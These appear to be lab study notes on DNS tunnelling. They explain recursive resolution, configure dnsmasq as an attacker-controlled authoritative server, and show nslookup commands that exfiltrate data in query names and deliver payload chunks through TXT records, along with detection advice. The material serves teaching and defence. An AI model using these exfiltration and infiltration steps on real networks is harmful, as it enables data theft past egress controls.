## Overview

DNS tunnelling abuses normal DNS resolution behaviour to move data into or out of a restricted network.

The core idea is that an internal host may not be able to connect directly to the internet, but it may still be allowed to make DNS queries through an internal recursive resolver.

Those DNS queries can eventually reach an attacker-controlled authoritative name server.

This enables two broad behaviours:

```text
Exfiltration:
Internal host embeds data inside DNS query names.

Infiltration:
External authoritative DNS server returns data inside DNS responses.
```

DNS tunnelling is useful to understand because DNS is often allowed through firewalls and can traverse networks where direct TCP connections are blocked.

---

# DNS Resolution Refresher

Internet traffic is routed using IP addresses, not human-readable names.

To access:

```text
www.example.com
```

a system must first resolve the name to an IP address.

For IPv4, this is usually done with an `A` record.

---

## Common DNS Record Types

|Record|Purpose|
|---|---|
|`A`|Maps a hostname to an IPv4 address|
|`AAAA`|Maps a hostname to an IPv6 address|
|`NS`|Identifies authoritative name servers for a zone|
|`TXT`|Stores arbitrary text data|
|`CNAME`|Creates an alias to another hostname|
|`MX`|Identifies mail servers for a domain|

---

# Recursive DNS Resolution Flow

A normal DNS lookup usually involves a recursive resolver.

The client asks the recursive resolver a question.

The resolver then performs the rest of the work.

Example query:

```text
What is the A record for www.example.com?
```

Resolution flow:

```text
Client
↓
Recursive resolver
↓
Root name server
↓
.com TLD name server
↓
example.com authoritative name server
↓
Recursive resolver
↓
Client
```

---

## Step-by-Step Resolution

### 1. Client Asks Recursive Resolver

The client asks its configured DNS resolver:

```text
A? www.example.com
```

---

### 2. Resolver Asks Root Name Server

The root name server does not know the final answer, but it knows where `.com` is handled.

It replies with:

```text
Ask the .com TLD name server.
```

---

### 3. Resolver Asks `.com` TLD Server

The `.com` TLD server does not know the IP for `www.example.com`, but it knows which authoritative name server handles `example.com`.

It replies with:

```text
Ask the authoritative name server for example.com.
```

---

### 4. Resolver Asks Authoritative Name Server

The authoritative name server for `example.com` returns the requested record.

Example:

```text
www.example.com A 93.184.216.34
```

---

### 5. Resolver Returns Answer to Client

The recursive resolver returns the result to the original client.

Most DNS requests use:

```text
UDP/53
```

---

# DNS Roles

## Client

The system requesting a name resolution.

Example:

```text
PGDATABASE01
```

---

## Recursive Resolver

The DNS server the client is configured to use.

It performs recursive lookups on behalf of the client.

Example:

```text
MULTISERVER03
10.4.50.64
```

---

## Root Name Server

Top-level DNS infrastructure that directs resolvers to TLD name servers.

---

## TLD Name Server

Handles a top-level domain such as:

```text
.com
.org
.net
.corp
```

---

## Authoritative Name Server

The server responsible for a specific DNS zone.

Example:

```text
FELINEAUTHORITY
Authoritative for feline.corp
```

# Lab Network Concept

The DNS tunnelling lab uses an attacker-controlled authoritative DNS server.

## Important Hosts

|Role|Host|Notes|
|---|---|---|
|Internal host|`PGDATABASE01`|Cannot directly reach the attacker-controlled DNS server|
|Recursive resolver|`MULTISERVER03`|DNS resolver configured for `PGDATABASE01`|
|Authoritative DNS server|`FELINEAUTHORITY`|Authoritative for `feline.corp`|
|Attacker system|Kali|Used to access lab systems and observe traffic|

---

## Important Network Detail

`PGDATABASE01` cannot directly reach `FELINEAUTHORITY`.

However:

```text
PGDATABASE01 can query MULTISERVER03 for DNS.
MULTISERVER03 can forward relevant DNS requests.
FELINEAUTHORITY receives queries for feline.corp.
```

This is the important tunnelling concept.

Even without direct outbound connectivity, the internal host can cause data to appear in DNS queries that reach an external authoritative server.

# High-Level DNS Tunnelling Flow

```text
PGDATABASE01
Internal host
    |
    | DNS query for encoded-data.feline.corp
    v
MULTISERVER03
Recursive resolver
    |
    | Determines authoritative name server for feline.corp
    v
FELINEAUTHORITY
Authoritative DNS server controlled by attacker
```

Key point:

```text
The internal host does not need direct network access to the authoritative DNS server.
```

The recursive resolver relays the request.

# Why DNS Enables Data Movement

DNS query names can contain attacker-controlled strings.

For example:

```text
exfiltrated-data.feline.corp
```

If `feline.corp` is controlled by the attacker, the query eventually reaches the attacker-controlled authoritative name server.

That means the attacker can observe:

```text
exfiltrated-data
```

inside the DNS query.

---

# Exfiltration Concept

Exfiltration means moving data out of a network.

With DNS, data can be embedded into subdomains.

Example:

```text
secretvalue.feline.corp
```

The controlled authoritative DNS server receives a query for that full name.

If the attacker logs DNS queries, they can recover:

```text
secretvalue
```

---

## Exfiltrating Larger Data

For larger data, split it into chunks.

Example workflow:

```text
1. Read file
2. Encode file as hex or Base64
3. Split encoded data into DNS-safe chunks
4. Send each chunk as a subdomain query
5. Log queries on authoritative DNS server
6. Reassemble chunks
7. Decode back to original data
```

Example conceptual chunked queries:

```text
001-4d5a900003000000.feline.corp
002-04000000ffff0000.feline.corp
003-b800000000000000.feline.corp
```

Server-side reconstruction:

```text
Sort chunks by sequence number.
Concatenate encoded values.
Decode from hex or Base64.
Recover original file.
```

> [!important]  
> DNS tunnelling often requires careful chunking because DNS label and packet sizes are limited.

---

# Infiltration Concept

Infiltration means moving data into a restricted network.

DNS responses can carry information back to the client.

One useful record type is:

```text
TXT
```

TXT records are designed to store arbitrary string data.

Example:

```text
www.feline.corp TXT "here's something useful!"
```

An internal host can query for TXT records and receive attacker-controlled text.

---

## Infiltrating Larger Data

For larger payloads or files, the authoritative server can return multiple encoded chunks through TXT records.

Example workflow:

```text
1. Encode payload as Base64 or hex
2. Split into chunks
3. Serve chunks as TXT records
4. Internal host queries TXT records
5. Internal host reassembles and decodes data
```

Conceptual TXT responses:

```text
chunk1.feline.corp TXT "TVqQAAMAAAAEAAAA"
chunk2.feline.corp TXT "AAAA//8AALgAAAAA"
chunk3.feline.corp TXT "AAAAAAAAAAAAAAA="
```

# DNSmasq as an Authoritative DNS Server

`dnsmasq` can act as a lightweight DNS server.

In the lab, it is used on `FELINEAUTHORITY` to serve the `feline.corp` zone.

---

## Basic Authoritative Configuration

Example `dnsmasq.conf`:

```ini
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```

Meaning:

|Directive|Meaning|
|---|---|
|`no-resolv`|Do not read upstream resolvers from `/etc/resolv.conf`|
|`no-hosts`|Do not read local host records from `/etc/hosts`|
|`auth-zone=feline.corp`|Serve as authoritative for `feline.corp`|
|`auth-server=feline.corp`|Define authoritative server identity|

Because no records are configured, unknown names under `feline.corp` return failure responses such as `NXDOMAIN`.

---

## Start DNSmasq in Foreground

```bash
sudo dnsmasq -C dnsmasq.conf -d
```

Option breakdown:

|Option|Meaning|
|---|---|
|`-C dnsmasq.conf`|Use the specified config file|
|`-d`|Run in foreground, no daemon mode|

Foreground mode is useful for labs because it can be stopped with:

```text
Ctrl+C
```

# Querying DNS Records

## Basic A Record Query

```bash
nslookup exfiltrated-data.feline.corp
```

Possible result:

```text
** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

This still proves the query path worked if the authoritative server sees the request.

The data is in the query name:

```text
exfiltrated-data
```

---

## Query a Specific DNS Server

```bash
nslookup exfiltrated-data.feline.corp 192.168.50.64
```

Format:

```text
nslookup <name> <dns_server>
```

This bypasses default resolver selection and asks the specified server directly.

---

## Flush Local DNS Cache

If responses appear stale:

```bash
resolvectl flush-caches
```

This is useful because `systemd-resolved` may cache DNS results locally.

---

# Understanding NXDOMAIN

`NXDOMAIN` means:

```text
The requested DNS name does not exist.
```

In DNS tunnelling, an `NXDOMAIN` response can still be useful.

Why?

```text
The attacker-controlled authoritative server still received the query.
The query name may contain exfiltrated data.
The response value is not always the important part.
```

Example:

```text
exfiltrated-data.feline.corp → NXDOMAIN
```

The query failed, but the authoritative server observed:

```text
exfiltrated-data
```

---

# DNS TXT Records for Infiltration

TXT records can carry arbitrary string data.

Example `dnsmasq_txt.conf`:

```ini
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT records
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

This config returns two TXT strings for:

```text
www.feline.corp
```

---

## Start DNSmasq with TXT Configuration

```bash
sudo dnsmasq -C dnsmasq_txt.conf -d
```

---

## Query TXT Records

From the internal host:

```bash
nslookup -type=txt www.feline.corp
```

Expected response:

```text
www.feline.corp text = "here's something useful!"
www.feline.corp text = "here's something else less useful."
```

This demonstrates that arbitrary strings can be sent into the internal network through DNS responses.

---

# DNS Tunnelling Directionality

## Exfiltration via Queries

Data leaves the internal network inside DNS query names.

```text
Internal host
↓
encoded-data.attacker-domain
↓
recursive resolver
↓
attacker authoritative DNS server
```

Example:

```text
password123.feline.corp
```

The authoritative server logs:

```text
password123
```

---

## Infiltration via Responses

Data enters the internal network inside DNS responses.

```text
Internal host queries TXT record
↓
recursive resolver asks attacker authoritative server
↓
authoritative server returns TXT data
↓
internal host receives response
```

Example:

```text
www.feline.corp TXT "payload chunk here"
```

---

# Important DNS Tunnelling Constraints

## Label Length Limits

Each DNS label is limited in size.

Conceptually:

```text
<label>.<label>.<domain>
```

Example:

```text
chunk1.feline.corp
```

Large data must be split into smaller chunks.

---

## Full Domain Length Limits

The entire DNS name also has a maximum length.

This limits how much data can fit into one query.

---

## Character Restrictions

DNS names are not arbitrary binary containers.

Data usually needs encoding such as:

```text
hex
Base32
Base64 variant safe for DNS
```

Avoid characters that are invalid or problematic in DNS labels.

---

## Caching

Resolvers may cache responses.

This can affect repeated queries.

Mitigations include:

```text
unique subdomains
sequence numbers
low TTL values where configurable
cache flushing in labs
```

---

## UDP Size Constraints

DNS commonly uses UDP/53.

Large responses may be truncated or require TCP fallback, which may not be allowed.

---

## Visibility

DNS is commonly logged.

Tunnelling may create suspicious patterns such as:

```text
many unique subdomains
long labels
high query volume
unusual TXT queries
high entropy DNS names
queries to newly registered domains
```

---

# DNS Tunnelling Data Patterns

## Plaintext Query

```text
exfiltrated-data.feline.corp
```

Easy to read, easy to detect.

---

## Hex-Encoded Query

```text
657866696c7472617465642d64617461.feline.corp
```

Represents:

```text

```

---

## Chunked Query

```text
001.657866696c747261746564.feline.corp
002.2d64617461.feline.corp
```

The numeric label helps reconstruct order.

---

## TXT-Based Inbound Chunk

```text
payload-001.feline.corp TXT "TVqQAAMAAAAEAAAA"
payload-002.feline.corp TXT "AAAA//8AALgAAAAA"
```

# Troubleshooting

## DNS Query Does Not Reach Authoritative Server

Check:

```text
authoritative DNS server is running
dnsmasq config contains correct auth-zone
tcpdump is on the correct interface
internal host is using expected recursive resolver
recursive resolver can reach authoritative server
domain delegation is correct
firewall allows UDP/53
query name is under the controlled zone
```

---

## Internal Host Queries 127.0.0.53

This is normal on Ubuntu with `systemd-resolved`.

The local stub resolver forwards to the configured DNS server.

Check real upstream DNS server:

```bash
resolvectl status
```

---

## Stale DNS Responses

Flush cache:

```bash
resolvectl flush-caches
```

Use unique subdomains to avoid cache reuse:

```text
001-test.feline.corp
002-test.feline.corp
```

---

## TXT Record Not Returned

Check:

```text
dnsmasq is running with the TXT config
TXT record name matches query name
query uses -type=txt
recursive resolver can reach authoritative server
cache is not returning old response
```

Command:

```bash
nslookup -type=txt www.feline.corp
```

---

## NXDOMAIN Returned

This may be expected if no record exists.

For exfiltration concepts, the important part is whether the authoritative server received the query.

Check tcpdump logs.

# Detection and Defensive Notes

DNS tunnelling may be detected through:

```text
high volume DNS queries
long subdomains
high-entropy labels
many unique subdomains
unusual TXT record usage
queries to suspicious or newly registered domains
DNS requests with encoded-looking data
unexpected internal hosts generating external DNS activity
authoritative DNS logs showing structured chunk patterns
```

Defensive controls include:

```text
force all DNS through approved resolvers
block direct outbound DNS to the internet
monitor recursive resolver logs
alert on high-entropy DNS labels
alert on excessive NXDOMAIN responses
inspect unusual TXT query volume
apply DNS egress filtering
use DNS security monitoring
restrict which systems can perform DNS recursion
```

# DNS Tunnelling vs Other Tunnels

|Method|Transport|Direction|Notes|
|---|---|---|---|
|DNS tunnelling|DNS, usually UDP/53|Query and response based|Useful when DNS is allowed but direct access is blocked|
|Chisel|HTTP/WebSocket|TCP tunnel|More interactive and flexible|
|SSH dynamic forwarding|SSH|SOCKS|Requires SSH connectivity|
|Netsh portproxy|TCP|Static forwarding|Native Windows, admin required|
|ICMP tunnelling|ICMP|Echo request/reply|May work where ICMP is allowed|
|HTTP tunnelling|HTTP/HTTPS|Web traffic|Often allowed but monitored|

# Key Takeaways

- DNS maps human-readable names to IP addresses.
    
- Recursive resolvers perform most DNS lookup work for clients.
    
- Authoritative name servers control answers for specific zones.
    
- DNS usually uses UDP/53.
    
- A client without direct internet access may still cause queries to reach an external authoritative name server.
    
- DNS query names can carry small pieces of outbound data.
    
- TXT records can carry arbitrary strings back into a network.
    
- NXDOMAIN responses can still prove exfiltration if the query reached the authoritative server.
    
- Large data must be encoded, chunked, ordered, logged, and reconstructed.
    
- DNS caching can interfere with repeated tests.
    
- DNS tunnelling is powerful but noisy when used heavily.
    
- Tools such as `dnscat2` automate these concepts into practical DNS tunnels.
